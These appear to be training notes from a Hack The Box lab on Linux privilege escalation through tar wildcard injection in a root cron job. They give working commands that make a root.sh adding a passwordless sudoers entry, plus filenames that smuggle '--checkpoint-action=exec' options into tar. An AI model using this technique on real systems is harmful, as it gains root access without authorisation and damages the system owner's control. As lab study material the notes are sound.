| **Character** | **Significance**                                                                                                                                      |
| ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `*`           | An asterisk that can match any number of characters in a file name.                                                                                   |
| `?`           | Matches a single character.                                                                                                                           |
| `[ ]`         | Brackets enclose characters and can match any single one at the defined position.                                                                     |
| `~`           | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |
| `-`           | A hyphen within brackets will denote a range of characters.                                                                                           |
#### Scenario

There is this `cron`:
```shell
# 
#
mh dom mon dow command 
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Tar command has this option:
```shell
--checkpoint[=N]
              Display progress messages every Nth record (default 10).

--checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

We can put a malicious payload in root.sh:
```shell
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

We can now create a file that are what we want to replace by the asterisk:
```shell
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

When `Cron` will run the * will be replace and give this payload:
```shell
cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh
```

---